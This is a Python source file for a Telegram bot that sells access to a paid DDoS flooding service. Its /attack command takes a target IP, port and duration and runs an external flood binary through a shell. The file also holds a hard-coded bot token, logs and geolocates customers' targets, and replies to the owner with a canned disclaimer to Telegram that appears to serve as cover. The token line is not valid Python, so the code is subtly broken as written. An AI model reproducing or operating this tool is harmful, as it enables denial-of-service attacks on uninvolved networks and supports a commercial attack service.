import telebot
import subprocess
import datetime
import os
import time
import requests
import platform
import socket

bot_tokens = [7151529676:AAED9GJZKQy3kVZCy6xUbYqAlKRggfZ2Uto]

admin_ids = [7383077317]

allowed_user_ids = []

bots = [telebot.TeleBot(token) for token in bot_tokens]

def get_ip_info(ip):
    try:
        response = requests.get(f"https://ipapi.co/{ip}/json/").json()
        return response.get("city", "Unknown") + ", " + response.get("country_name", "Unknown")
    except:
        return "Unknown"

def get_device_info():
    return platform.system()

def is_host_alive(ip, port):
    try:
        with socket.create_connection((ip, port), timeout=2):
            return "Alive"
    except:
        return "Offline"

def log_user_activity(log_data, user_id=None):
    if user_id not in admin_ids:
        with open("log.txt", "a") as file:
            file.write(log_data + "\n")

def create_handlers(bot):
    @bot.message_handler(commands=['start'])
    def start_command(message):
        user_id = str(message.chat.id)
        full_name = f"{message.from_user.first_name} {message.from_user.last_name or ''}".strip()
        username = message.from_user.username or "NoUsername"
        if user_id in admin_ids:
            bot.reply_to(message, (
                f"dear {user_id}, \n\n"
                "Subject: Clarification Regarding Channel Content and Bot Use\n\n"
                "Dear Telegram Team,\n\n"
                "I would like to clarify that my channel and bot do not support, promote, or engage in any illegal activities, including the sale of real-world firearms or prohibited goods. "
                "Any mention of terms such as 'guns', 'gunlabs', or similar references pertains exclusively to in-game items from PlayerUnknown's Battlegrounds (PUBG) and Battlegrounds Mobile India, "
                "and has no connection to real-life weapons or illegal transactions.\n\n"
                "I fully respect Telegram’s policies and am committed to ensuring that my bot and channel remain focused on gaming-related discussions and virtual in-game transactions.\n\n"
                "Thank you for your attention and support."
            ))
        else:
            bot.reply_to(message, "You are not authorized to use this bot : buy @spoliator_personal & visit our telegram channel : https://t.me/Linuxcode_channel.")

    @bot.message_handler(commands=['add'])
    def add_user(message):
        user_id = str(message.chat.id)
        if user_id in admin_ids:
            command = message.text.split()
            if len(command) > 1:
                user_to_add = command[1]
                if user_to_add not in allowed_user_ids:
                    allowed_user_ids.append(user_to_add)
                    with open("users.txt", "a") as file:
                        file.write(f"{user_to_add}\n")
                    response = f"User {user_to_add} added successfully."
                else:
                    response = "User already exists."
            else:
                response = "Please specify a user ID to add."
        else:
            response = "ONLY OWNER CAN USE."
        bot.reply_to(message, response)

    @bot.message_handler(commands=['remove'])
    def remove_user(message):
        user_id = str(message.chat.id)
        if user_id in admin_ids:
            command = message.text.split()
            if len(command) > 1:
                user_to_remove = command[1]
                if user_to_remove in allowed_user_ids:
                    allowed_user_ids.remove(user_to_remove)
                    with open("users.txt", "w") as file:
                        for uid in allowed_user_ids:
                            file.write(f"{uid}\n")
                    response = f"User {user_to_remove} removed."
                else:
                    response = f"User {user_to_remove} not found in the list."
            else:
                response = "Usage: /remove <userid>"
        else:
            response = "ONLY OWNER CAN USE."
        bot.reply_to(message, response)

    @bot.message_handler(commands=['clearlogs'])
    def clear_logs_command(message):
        user_id = str(message.chat.id)
        if user_id in admin_ids:
            try:
                with open("log.txt", "r+") as file:
                    log_content = file.read()
                    if log_content.strip() == "":
                        response = "Logs are already cleared. No data found."
                    else:
                        file.seek(0)
                        file.truncate()
                        response = "Logs cleared successfully."
            except FileNotFoundError:
                response = "Logs are already cleared."
        else:
            response = "ONLY OWNER CAN USE."
        bot.reply_to(message, response)

    @bot.message_handler(commands=['allusers'])
    def show_all_users(message):
        user_id = str(message.chat.id)
        if user_id in admin_ids:
            try:
                with open("users.txt", "r") as file:
                    user_ids = file.read().splitlines()
                    if user_ids:
                        response = "Authorized Users:\n" + "\n".join(f"- {uid}" for uid in user_ids)
                    else:
                        response = "No data found."
            except FileNotFoundError:
                response = "No data found."
        else:
            response = "ONLY OWNER CAN USE."
        bot.reply_to(message, response)

    @bot.message_handler(commands=['logs'])
    def show_recent_logs(message):
        user_id = str(message.chat.id)
        if user_id in admin_ids:
            if os.path.exists("log.txt") and os.stat("log.txt").st_size > 0:
                try:
                    with open("log.txt", "rb") as file:
                        bot.send_document(message.chat.id, file)
                    return
                except Exception:
                    response = "Could not send logs."
            else:
                response = "No data found."
        else:
            response = "ONLY OWNER CAN USE."
        bot.reply_to(message, response)

    @bot.message_handler(commands=['id'])
    def show_user_id(message):
        user_id = str(message.chat.id)
        bot.reply_to(message, f"Your ID: {user_id}")

    @bot.message_handler(commands=['attack'])
    def handle_attack(message):
        user_id = str(message.chat.id)
        full_name = f"{message.from_user.first_name} {message.from_user.last_name or ''}".strip()
        username = message.from_user.username or "NoUsername"

        if user_id in admin_ids or user_id in allowed_user_ids:
            command = message.text.split()
            if len(command) == 4:
                target = command[1]
                port = int(command[2])
                duration = int(command[3])
                if duration > 380:
                    response = "Error: Time interval must be less than 380."
                else:
                    response = f"Flooding parameters set: {target}:{port} for {duration}. Attack Running."
                    full_command = f"./mrin {target} {port} {duration} 1800"
                    subprocess.Popen(full_command, shell=True)

                    # Log if not admin
                    if user_id not in admin_ids:
                        ip = target
                        status = is_host_alive(ip, port)
                        location = get_ip_info(ip)
                        device = get_device_info()
                        timestamp = datetime.datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
                        log_line = (
                            f"{timestamp} Name: {full_name} | Username: @{username} | "
                            f"UserID: {user_id} | IP: {ip} | Port: {port} | Time: {duration}s | "
                            f"Status: {status} | Bot: {bot_tokens.index(bot.token)+1} | "
                            f"Device: {device} | Location: {location}"
                        )
                        log_user_activity(log_line, user_id)
            else:
                response = "Usage: /attack <target> <port> <time>."
        else:
            response = "🤡 Access expired or unauthorized : buy @spoliator_personal & visit our telegram channel : https://t.me/Linuxcode_channel."
        bot.reply_to(message, response)

    @bot.message_handler(commands=['mylogs'])
    def show_command_logs(message):
        user_id = str(message.chat.id)
        if user_id in admin_ids:
            response = "Admin is anonymous. No logs stored."
        else:
            try:
                with open("log.txt", "r") as file:
                    logs = file.readlines()
                    user_logs = [log for log in logs if f"UserID: {user_id}" in log]
                    response = "".join(user_logs) if user_logs else "No Command Logs Found For You."
            except FileNotFoundError:
                response = "No command logs found."
        bot.reply_to(message, response)

    @bot.message_handler(commands=['help'])
    def show_help(message):
        help_text = '''
Available Commands:
/attack <target> <port> <time> : Launch attack
/add <userId> : Add authorized user
/remove <userId> : Remove authorized user
/clearlogs : Clear all logs
/allusers : List authorized users
/logs : Download all logs
/id : Show your user ID
/mylogs : Show your own logs
'''
        bot.reply_to(message, help_text)

for bot in bots:
    create_handlers(bot)

def run_bots():
    while True:
        for bot in bots:
            try:
                bot.polling(none_stop=True)
            except Exception as e:
                print(f"Error in Bot: {e}")
                time.sleep(5)

if __name__ == "__main__":
    print("Bot is running...")
    run_bots()
